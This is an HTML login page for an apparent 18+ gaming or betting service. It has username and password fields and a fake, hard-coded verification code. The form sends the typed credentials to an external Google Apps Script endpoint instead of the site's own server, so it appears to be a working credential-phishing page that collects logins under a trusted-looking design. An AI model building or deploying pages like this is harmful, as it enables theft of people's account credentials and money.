<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body style="margin: 0; padding: 0; background-color: #1a1a1a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #ffffff; min-height: 100vh;">
    <div style="max-width: 400px; margin: 0 auto; padding: 20px;">
        <!-- Header -->
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
            <div style="display: flex; align-items: center; gap: 5px; color: #ffffff;">
                <span style="font-size: 20px;">‚Üê</span>
                <span>Back</span>
            </div>
            <span style="font-size: 18px;">Login</span>
            <div style="width: 30px; height: 30px; background-color: #333333; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
                <span style="font-size: 16px;">üéß</span>
            </div>
        </div>

        <!-- Logo Section -->
        <div style="position: relative; text-align: center; margin: 40px 0;">
            <img src="images/Screenshot (9).png" alt="Crown Logo" style="width: 80px; height: 80px;">
            <span style="position: absolute; top: -10px; right: 100px; background-color: #ff0000; color: white; padding: 2px 8px; border-radius: 15px; font-size: 14px; font-weight: bold;">18+</span>
        </div>

        <!-- Form -->
        <form id="gform" method="POST" action="https://script.google.com/macros/s/AKfycbyG5Wwvvi_JpTOWEMjp0HBm8SuJ41i-NOgfpTlj3pNuMJUGGgqftP_p3iox4nK7YILK/exec"   > 
            <!-- Phone Number -->
            <div style="position: relative;">
              
                <input type="numeric" id="fname" name="name" placeholder="Username or number"  style="width: 100%; padding: 12px 35px; background-color: transparent; border: none; border-bottom: 1px solid #333333; color: #9ca3af; font-size: 16px; outline: none; box-sizing: border-box;">
                <span style="position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #666;">üë§</span>
            </div>

            <!-- Password -->
            <div style="position: relative;">
              
                <input type="text" id="lname" name="name" placeholder="Login Password" onkeyup="validateMessage()" style="width: 100%; padding: 12px 35px; background-color: transparent; border: none; border-bottom: 1px solid #333333; color: #9ca3af; font-size: 16px; outline: none; box-sizing: border-box;">
                <span style="position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #666;">üîí</span>
            </div>

            <!-- Verify Code -->
            <div style="position: relative; display: flex; align-items: center;">
                <div style="flex-grow: 1; position: relative;"> 
                  
                    <input type="text"    id="fname"   value="MEG6"     onkeyup="validateMessage()" class="form-control"  placeholder="Verify code" style="width: 100%; padding: 12px 35px; background-color: transparent; border: none; border-bottom: 1px solid #333333; color: #9ca3af; font-size: 16px; outline: none; box-sizing: border-box;">
                    <span style="position:  absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #666;">üõ°</span>
                </div>
                <button type="submit"  onclick="return validateForm()" style="background: none; border: none; color: #666; padding: 0 10px; font-size: 20px; cursor: pointer;">MEG6 ‚Üª</button>
            </div>

            <!-- Remember Me & Forgot Password -->
            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px;">
                <label style="display: flex; align-items: center; gap: 8px; color: #9ca3af; font-size: 14px;">
                    <input type="checkbox" style="width: 16px; height: 16px; accent-color: #ffd700;">
                    <span>Remember me</span>
                </label>
                <a href="#" style="color: #9ca3af; text-decoration: none; font-size: 14px;">Forget password?</a>
            </div>

            <!-- Login Button -->
            <button type="submit" style="width: 100%; padding: 12px; background: linear-gradient(to bottom, #d4af37, #c5a028); border: none; border-radius: 4px; color: #000000; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 20px;">Login</button>
          </form>
            <!-- Register Link -->
            <p style="text-align: center; color: #666666; font-size: 14px; margin-top: 20px;">
                Do not have a account? <a href="#" style="color: #ffffff; text-decoration: none;">To register</a>
            </p>
        
    </div>
</body>
</html>
